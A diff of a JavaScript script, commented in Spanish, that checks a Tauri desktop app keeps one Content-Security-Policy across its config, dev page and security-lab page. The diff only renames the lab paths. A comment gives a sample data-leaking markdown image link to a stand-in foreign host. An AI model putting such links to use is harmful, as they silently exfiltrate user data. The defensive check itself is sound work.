@@ -7,7 +7,7 @@
  * `null` —como estuvo—, un `![](http://ajeno/?d=…)` dispara el GET al pintarse,
  * sin un clic y sin una línea en `publications.jsonl`. Nada falla, nada se ve, y
  * `ARCHITECTURE.md` § 7 promete que todo lo que sale queda anotado. El ataque y su
- * control negativo: `attacks/window.mjs`.
+ * control negativo: `tests/security/window.mjs`.
  *
  * Y una política se afloja sola con el tiempo: alguien mete un `img-src *` para
  * que se vea un avatar, y la puerta vuelve a estar abierta sin que nadie lo note
@@ -20,7 +20,7 @@
  * |---|---|
  * | `src-tauri/tauri.conf.json` | En producción: Tauri la manda como cabecera del recurso |
  * | `index.html` | En desarrollo, donde la ventana carga del servidor de Vite y Tauri no llega a poner nada |
- * | `attacks/window.html` | En el laboratorio: si no es la misma, lo que salga ahí no dice nada de la app |
+ * | `tests/security/window.html` | En el laboratorio: si no es la misma, lo que salga ahí no dice nada de la app |
  *
  * Las dos primeras se aplican **a la vez** en producción, y dos políticas se
  * intersecan. Si divergen, lo que gobierna es la más estricta de cada directiva y
@@ -34,7 +34,7 @@ const raiz = (p) => fileURLToPath(new URL(`../${p}`, import.meta.url));
 const SITIOS = [
   ["src-tauri/tauri.conf.json", (t) => JSON.parse(t).app?.security?.csp],
   ["index.html", (t) => t.match(/http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]*)"/)?.[1]],
-  ["attacks/window.html", (t) => t.match(/http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]*)"/)?.[1]],
+  ["tests/security/window.html", (t) => t.match(/http-equiv="Content-Security-Policy"\s*\n?\s*content="([^"]*)"/)?.[1]],
 ];
 
 /**
@@ -161,7 +161,7 @@ if (fallos.length === 0) {
 for (const f of fallos) console.error(`  ${f}`);
 console.error(
   `\nLo que esta política impide está medido, con su control negativo, en\n` +
-    `\`attacks/window.mjs\`. Si hace falta aflojarla, la forma de saberlo es\n` +
+    `\`tests/security/window.mjs\`. Si hace falta aflojarla, la forma de saberlo es\n` +
     `correr eso antes y después — no discutirlo: un permiso de más no rompe nada\n` +
     `visible, y por eso vuelve solo.`,
 );
